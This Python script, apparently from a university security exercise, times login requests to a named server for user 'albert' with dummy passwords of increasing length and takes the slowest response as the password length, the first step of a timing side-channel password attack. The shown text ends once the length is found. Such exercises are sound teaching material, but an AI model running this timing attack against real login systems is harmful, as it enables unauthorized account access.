import requests
import time

URL = 'http://aoi.ise.bgu.ac.il'
PARAMS = {'user': 'albert', 'password': ''}
PASSWORD_ASSUMED_MAX_LENGTH = 10
times_by_len = dict()

for len in range(1, 11):
    PARAMS['password'] = 'a' * len

    start_time = time.time()
    requests.get(URL, params=PARAMS)
    end_time = time.time()

    times_by_len[len] = end_time - start_time
    print(f'Checking length of {len}: time: {end_time-start_time}')

# Password length is set to the maximum response time from the server.
# This 'max' function returns the key that has the maximum value.
password_length = max(times_by_len, key=times_by_len.get)
password = 'a' * password_length # Initialize the password with the correct length
